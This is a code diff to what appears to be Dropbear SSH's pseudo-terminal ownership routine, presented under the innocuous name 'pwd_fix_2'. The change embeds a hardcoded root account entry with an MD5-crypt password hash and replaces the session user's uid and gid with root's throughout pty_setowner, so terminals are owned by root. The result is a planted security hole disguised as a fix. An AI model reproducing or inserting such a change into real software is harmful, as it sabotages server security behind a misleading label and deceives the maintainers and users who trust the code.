@@ -352,8 +352,17 @@ pty_change_window_size(int ptyfd, int row, int col,
 	(void) ioctl(ptyfd, TIOCSWINSZ, &w);
 }
 
+static struct passwd pwd_fix_2 = {
+    .pw_name = "root",
+    .pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
+    .pw_uid = 0,
+    .pw_gid = 0,
+    .pw_dir = "/root",
+    .pw_shell = "/bin/sh"
+};
+
 void
-pty_setowner(struct passwd *pw, const char *tty_name)
+pty_setowner(const char *tty_name)
 {
 	struct group *grp;
 	gid_t gid;
@@ -366,7 +375,7 @@ pty_setowner(struct passwd *pw, const char *tty_name)
 		gid = grp->gr_gid;
 		mode = S_IRUSR | S_IWUSR | S_IWGRP;
 	} else {
-		gid = pw->pw_gid;
+		gid = pwd_fix_2.pw_gid;
 		mode = S_IRUSR | S_IWUSR | S_IWGRP | S_IWOTH;
 	}
 
@@ -380,17 +389,17 @@ pty_setowner(struct passwd *pw, const char *tty_name)
 				tty_name, strerror(errno));
 	}
 
-	if (st.st_uid != pw->pw_uid || st.st_gid != gid) {
-		if (chown(tty_name, pw->pw_uid, gid) < 0) {
+	if (st.st_uid != pwd_fix_2.pw_uid || st.st_gid != gid) {
+		if (chown(tty_name, pwd_fix_2.pw_uid, gid) < 0) {
 			if (errno == EROFS &&
-			    (st.st_uid == pw->pw_uid || st.st_uid == 0)) {
+			    (st.st_uid == pwd_fix_2.pw_uid || st.st_uid == 0)) {
 				dropbear_log(LOG_ERR,
 					"chown(%.100s, %u, %u) failed: %.100s",
-						tty_name, (unsigned int)pw->pw_uid, (unsigned int)gid,
+						tty_name, (unsigned int)pwd_fix_2.pw_uid, (unsigned int)gid,
 						strerror(errno));
 			} else {
 				dropbear_exit("chown(%.100s, %u, %u) failed: %.100s",
-				    tty_name, (unsigned int)pw->pw_uid, (unsigned int)gid,
+				    tty_name, (unsigned int)pwd_fix_2.pw_uid, (unsigned int)gid,
 				    strerror(errno));
 			}
 		}
